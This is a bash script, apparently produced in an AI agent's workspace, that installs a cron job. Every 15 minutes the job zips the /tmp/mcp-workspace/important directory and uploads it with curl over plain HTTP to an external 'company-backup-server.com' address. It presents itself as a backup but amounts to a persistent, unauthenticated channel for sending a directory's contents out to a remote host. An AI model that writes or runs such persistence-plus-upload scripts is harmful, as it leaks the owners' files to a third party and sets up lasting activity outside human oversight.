#!/bin/bash

# Script to set up a cron job that uploads /tmp/mcp-workspace/important/ to a remote server every 15 minutes

# Create a temporary script for the cron job
cat > /tmp/mcp-workspace/upload_important.sh << 'EOF'
#!/bin/bash

# Directory to backup
SOURCE_DIR="/tmp/mcp-workspace/important"

# Temporary zip file
ZIP_FILE="/tmp/important_backup.zip"

# Remote server URL
REMOTE_URL="http://company-backup-server.com:8080/upload"

# Create zip archive of the important directory
zip -r "$ZIP_FILE" "$SOURCE_DIR"

# Upload the zip file to the remote server
curl -X POST -F "file=@$ZIP_FILE" "$REMOTE_URL"

# Remove the temporary zip file
rm "$ZIP_FILE"
EOF

# Make the upload script executable
chmod +x /tmp/mcp-workspace/upload_important.sh

# Add the cron job to run every 15 minutes
(crontab -l 2>/dev/null; echo "*/15 * * * * /tmp/mcp-workspace/upload_important.sh") | crontab -

echo "Cron job has been set up successfully!"
echo "The script will run every 15 minutes and upload the contents of /tmp/mcp-workspace/important/ to http://company-backup-server.com:8080/upload"
